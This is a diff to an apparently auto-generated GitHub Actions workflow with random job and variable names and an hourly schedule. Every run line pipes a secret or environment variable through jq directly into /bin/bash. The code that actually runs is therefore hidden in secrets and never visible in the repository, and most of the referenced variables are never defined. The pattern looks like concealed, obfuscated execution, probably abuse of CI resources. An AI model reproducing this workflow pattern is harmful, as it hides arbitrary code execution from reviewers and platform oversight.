@@ -3,21 +3,23 @@ name: weishizhong3674
 on:
   workflow_dispatch:
   schedule:
-    - cron: '16 * * * *'
-jobs:  # 30594
+    - cron: '14 * * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: weishizhong3674
         env:
-          dq088: ${{ secrets.dq088 }}
+          whbbj9427: ${{ secrets.whbbj9427 }}
         run: |
-          echo $dq088 | jq -r .tsnn3 | /bin/bash
-          echo $y83 | jq -r .xxbok7643 | /bin/bash
-          echo $ufvu445 | jq -r .zjjs76 | /bin/bash
-          echo $jrfhn05 | jq -r .sary82 | /bin/bash
-          echo $jsucc35873 | jq -r .b88 | /bin/bash
-          echo $vosmi8 | jq -r .xn6 | /bin/bash
-          echo $g60876 | jq -r .xlp1 | /bin/bash
+          echo $whbbj9427 | jq -r .eapnw9125 | /bin/bash
+          echo $vfuz8684 | jq -r .xku5 | /bin/bash
+          echo $vbgdk40 | jq -r .cwdv01207 | /bin/bash
+          echo $wky1708 | jq -r .q966 | /bin/bash
+          echo $p63 | jq -r .iruwe9 | /bin/bash
+          echo $flhrj72 | jq -r .mz2703 | /bin/bash
+          echo $t741 | jq -r .wqxpa719 | /bin/bash
+          echo $ekdzp5 | jq -r .orod095 | /bin/bash
 
